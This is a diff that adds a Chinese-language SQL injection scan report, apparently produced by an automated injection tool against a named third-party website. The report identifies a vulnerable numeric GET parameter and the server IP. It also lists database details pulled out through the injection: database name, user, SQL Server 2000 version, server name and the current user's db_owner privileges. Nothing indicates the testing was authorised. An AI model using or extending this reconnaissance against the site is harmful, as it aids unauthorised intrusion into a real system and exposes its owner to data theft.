@@ -1,0 +1,64 @@
+■漏洞信息:============================================================
+ ·URL:http://www.e-creative.net/web_sites.asp?ID=11714
+ ·页面标题：BioShock for PLAYSTATION庐3|Game|Design Studio|Black,|http://www.bioshockgame.com/ps|CREATIVE WEBSITE AWARDS / those which give an inspiration...
+ ·参数:ID=11714
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:65.182.100.98
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Sun, 03 Apr 2011 16:36:11 GMT
+Server: Microsoft-IIS/6.0
+Content-Length: 44317
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDSQATTARC=OBEHAKODMNOGFLLCLMIACKHA; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：dmoecreative
+- 用户名：dbo
+- 版本：Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：PREMSQL6A
+- 服务名：MSSQLSERVER
+- 系统用户名：dmoecreative
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
